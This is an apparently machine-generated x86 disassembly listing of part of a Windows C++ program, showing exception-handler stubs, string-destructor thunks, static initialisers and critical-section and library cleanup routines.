jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433696
lea ecx [ ebp - 0x1a4 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_4336a2
mov eax r--data
jmp __CxxFrameHandler
sub_4336b0
lea ecx [ ebp - 0xa4 ]
jmp sub_401db0
sub_4336bb
lea ecx [ ebp - 0xa4 ]
jmp sub_401db0
sub_4336c6
mov eax r--data
jmp __CxxFrameHandler
sub_4336d0
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4336d9
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4336f3
mov eax r--data
jmp __CxxFrameHandler
sub_4336fd
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_433706
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_433720
mov eax r--data
jmp __CxxFrameHandler
sub_43372a
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_433733
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
mov ecx [ ebp - 0x34 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43374d
mov eax r--data
jmp __CxxFrameHandler
sub_433757
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_433760
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43377a
mov eax r--data
jmp __CxxFrameHandler
sub_433784
lea ecx [ ebp - 0x2c ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_43378d
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_4337a7
mov eax r--data
jmp __CxxFrameHandler
sub_4337c0
mov eax r--data
jmp __CxxFrameHandler
sub_4337d0
mov ecx rw-data
call sub_401600
push sub_433e10
call sub_42e6e6
pop ecx
retn
sub_4337f0
mov ecx rw-data
call sub_401600
push sub_433e30
call sub_42e6e6
pop ecx
retn
sub_433810
mov ecx rw-data
call sub_401600
push sub_433ea0
call sub_42e6e6
pop ecx
retn
sub_433830
mov ecx rw-data
call sub_401600
push sub_433eb0
call sub_42e6e6
pop ecx
retn
sub_433850
mov ecx rw-data
call sub_401600
push sub_433ec0
call sub_42e6e6
pop ecx
retn
sub_433870
call sub_403370
mov [ rw-data ] al
retn
sub_433880
call sub_4033f0
test al al
je r-xdata
mov [ rw-data ] 0x0
call sub_403470
test al al
mov [ rw-data ] 0x1
jne r-xdata
retn
sub_4338b0
mov ecx rw-data
call sub_401600
push sub_433ed0
call sub_42e6e6
pop ecx
retn
sub_4338d0
mov ecx rw-data
call sub_401600
push sub_433ee0
call sub_42e6e6
pop ecx
retn
sub_4338f0
mov ecx rw-data
call sub_401600
push sub_433ef0
call sub_42e6e6
pop ecx
retn
sub_433910
mov ecx rw-data
call sub_401600
push sub_433f00
call sub_42e6e6
pop ecx
retn
sub_433930
mov ecx rw-data
call sub_401600
push sub_433f10
call sub_42e6e6
pop ecx
retn
sub_433950
mov ecx rw-data
call sub_401600
push sub_433f30
call sub_42e6e6
pop ecx
retn
sub_433970
mov ecx rw-data
call sub_401600
push sub_433f40
call sub_42e6e6
pop ecx
retn
sub_433990
mov ecx rw-data
call sub_401600
push sub_433f50
call sub_42e6e6
pop ecx
retn
sub_4339b0
mov ecx rw-data
call sub_401600
push sub_433f70
call sub_42e6e6
pop ecx
retn
sub_4339d0
mov ecx rw-data
call sub_401600
push sub_433f80
call sub_42e6e6
pop ecx
retn
sub_4339f0
mov ecx rw-data
call sub_401600
push sub_433f90
call sub_42e6e6
pop ecx
retn
sub_433a10
mov ecx rw-data
call sub_401600
push sub_433fb0
call sub_42e6e6
pop ecx
retn
sub_433a30
mov ecx rw-data
call sub_401600
push sub_433fd0
call sub_42e6e6
pop ecx
retn
sub_433a50
mov ecx rw-data
call sub_4147f0
push sub_433fc0
call sub_42e6e6
pop ecx
retn
sub_433a70
mov ecx rw-data
call sub_401600
push sub_433fe0
call sub_42e6e6
pop ecx
retn
sub_433a90
mov ecx rw-data
call sub_401600
push sub_433ff0
call sub_42e6e6
pop ecx
retn
sub_433ab0
mov ecx rw-data
call sub_401600
push sub_434000
call sub_42e6e6
pop ecx
retn
sub_433ad0
mov ecx rw-data
call sub_401600
push sub_434010
call sub_42e6e6
pop ecx
retn
sub_433af0
mov ecx rw-data
call sub_401600
push sub_434020
call sub_42e6e6
pop ecx
retn
sub_433b10
mov ecx rw-data
call sub_401600
push sub_434040
call sub_42e6e6
pop ecx
retn
sub_433b30
mov ecx rw-data
call sub_401600
push sub_434050
call sub_42e6e6
pop ecx
retn
sub_433b50
mov ecx rw-data
call sub_401600
push sub_434060
call sub_42e6e6
pop ecx
retn
sub_433b70
mov ecx rw-data
call sub_401600
push sub_434090
call sub_42e6e6
pop ecx
retn
sub_433b90
push rw-data
call [ InitializeCriticalSection@IAT ]
push r-xdata
call sub_42e6e6
pop ecx
retn
sub_433bb0
mov ecx rw-data
call sub_401600
push sub_4340a0
call sub_42e6e6
pop ecx
retn
sub_433bd0
mov ecx rw-data
call sub_401600
push sub_4340c0
call sub_42e6e6
pop ecx
retn
sub_433bf0
mov ecx rw-data
call sub_401600
push sub_4340f0
call sub_42e6e6
pop ecx
retn
sub_433c10
push rw-data
call [ InitializeCriticalSection@IAT ]
push sub_4340d0
call sub_42e6e6
pop ecx
retn
sub_433c30
mov ecx rw-data
call sub_401600
push sub_434110
call sub_42e6e6
pop ecx
retn
sub_433c50
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_434100
call sub_42e6e6
pop ecx
retn
sub_433c70
mov ecx rw-data
call sub_401600
push sub_434120
call sub_42e6e6
pop ecx
retn
sub_433c90
mov ecx rw-data
call sub_401600
push sub_434150
call sub_42e6e6
pop ecx
retn
sub_433cb0
push rw-data
call [ InitializeCriticalSection@IAT ]
push sub_434130
call sub_42e6e6
pop ecx
retn
sub_433cd0
mov ecx rw-data
call sub_401600
push sub_434180
call sub_42e6e6
pop ecx
retn
sub_433cf0
mov ecx rw-data
call sub_401600
push sub_434190
call sub_42e6e6
pop ecx
retn
sub_433d10
mov ecx rw-data
call sub_401600
push sub_4341d0
call sub_42e6e6
pop ecx
retn
sub_433d30
push r-xdata
call sub_42e6e6
pop ecx
retn
sub_433d3c
mov ecx rw-data
call sub_42e02f
push sub_4341f6
call sub_42e6e6
pop ecx
retn
sub_433d52
mov ecx rw-data
call sub_401600
push sub_434200
call sub_42e6e6
pop ecx
retn
sub_433d68
mov ecx rw-data
call sub_401600
push sub_43420a
call sub_42e6e6
pop ecx
retn
sub_433d7e
call [ GetProcessHeap@IAT ]
push sub_434214
mov [ rw-data ] r--data
mov [ rw-data ] eax
mov [ rw-data ] 0x0
call sub_42e6e6
pop ecx
retn
sub_433da6
push rw-data
mov ecx rw-data
call sub_42e1f7
push sub_43421e
call sub_42e6e6
pop ecx
retn
sub_433dc1
mov ecx rw-data
call sub_401600
push sub_434229
call sub_42e6e6
pop ecx
retn
sub_433dd7
mov ecx rw-data
call sub_42e31c
push sub_434233
call sub_42e6e6
pop ecx
retn
sub_433ded
mov ecx rw-data
call sub_401600
push sub_43423d
call sub_42e6e6
pop ecx
retn
sub_433e10
mov ecx rw-data
jmp sub_401680
sub_433e20
mov ecx rw-data
jmp sub_401830
sub_433e30
mov ecx rw-data
jmp sub_401680
sub_433e40
retn
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_433e60
mov eax [ rw-data ]
push eax
call [ FreeLibrary@IAT ]
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_433ea0
mov ecx rw-data
jmp sub_401680
sub_433eb0
mov ecx rw-data
jmp sub_401680
sub_433ec0
mov ecx rw-data
jmp sub_401680
sub_433ed0
mov ecx rw-data
jmp sub_401680
sub_433ee0
mov ecx rw-data
jmp sub_401680
sub_433ef0
mov ecx rw-data
jmp sub_401680
sub_433f00
mov ecx rw-data
jmp sub_401680
sub_433f10
mov ecx rw-data
jmp sub_401680
sub_433f20
mov ecx rw-data
jmp sub_40e6b0
sub_433f30
mov ecx rw-data
jmp sub_401680
sub_433f40
mov ecx rw-data
jmp sub_401680
sub_433f50
mov ecx rw-data
jmp sub_401680
sub_433f60
mov ecx rw-data
jmp sub_40f7a0
sub_433f70
mov ecx rw-data
jmp sub_401680
sub_433f80
mov ecx rw-data
jmp sub_401680
sub_433f90
mov ecx rw-data
jmp sub_401680
sub_433fa0
mov ecx rw-data
jmp sub_412030
sub_433fb0
mov ecx rw-data
jmp sub_401680
sub_433fc0
mov ecx rw-data
jmp sub_413580
sub_433fd0
mov ecx rw-data
jmp sub_401680
sub_433fe0
mov ecx rw-data
jmp sub_401680
sub_433ff0
mov ecx rw-data
jmp sub_401680
sub_434000
mov ecx rw-data
jmp sub_401680
sub_434010
mov ecx rw-data
jmp sub_401680
sub_434020
mov ecx rw-data
jmp sub_401680
sub_434030
retn
sub_434040
mov ecx rw-data
jmp sub_401680
sub_434050
mov ecx rw-data
jmp sub_401680
sub_434060
mov ecx rw-data
jmp sub_401680
sub_434075
mov [ rw-data ] r--data
call [ DeleteCriticalSection@IAT ]
retn
sub_434090
mov ecx rw-data
jmp sub_401680
sub_4340a0
mov ecx rw-data
jmp sub_401680
sub_4340b0
mov ecx rw-data
jmp sub_41d530
sub_4340c0
mov ecx rw-data
jmp sub_401680
sub_4340d0
push rw-data
mov [ rw-data ] r--data
call [ DeleteCriticalSection@IAT ]
retn
sub_4340f0
mov ecx rw-data
jmp sub_401680
__imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_434100
mov ecx rw-data
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_434110
mov ecx rw-data
jmp sub_401680
sub_434120
mov ecx rw-data
jmp sub_401680
sub_434130
push rw-data
mov [ rw-data ] r--data
call [ DeleteCriticalSection@IAT ]
retn
sub_434150
mov ecx rw-data
jmp sub_401680
__imp_??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ_434160
mov ecx rw-data
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
__imp_??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ_434170
mov ecx rw-data
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
sub_434180
mov ecx rw-data
jmp sub_401680
sub_434190
mov ecx rw-data
jmp sub_401680
sub_4341a0
retn
sub_4341b0
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call [ FreeLibrary@IAT ]
mov [ rw-data ] 0x0
sub_4341d0
mov ecx rw-data
jmp sub_401680
sub_4341e5
call [ VariantClear@IAT ]
test eax eax
jge r-xdata
retn
push eax
call sub_42cee0
sub_4341f6
mov ecx rw-data
jmp sub_42df27
sub_434200
mov ecx rw-data
jmp sub_401680
sub_43420a
mov ecx rw-data
jmp sub_401680
sub_434214
mov ecx rw-data
jmp sub_42e13b
sub_43421e
mov [ rw-data ] r--data
retn
sub_434229
mov ecx rw-data
jmp sub_401680
sub_434233
mov ecx rw-data
jmp sub_42e2cb
sub_43423d
mov ecx rw-data
jmp sub_401680
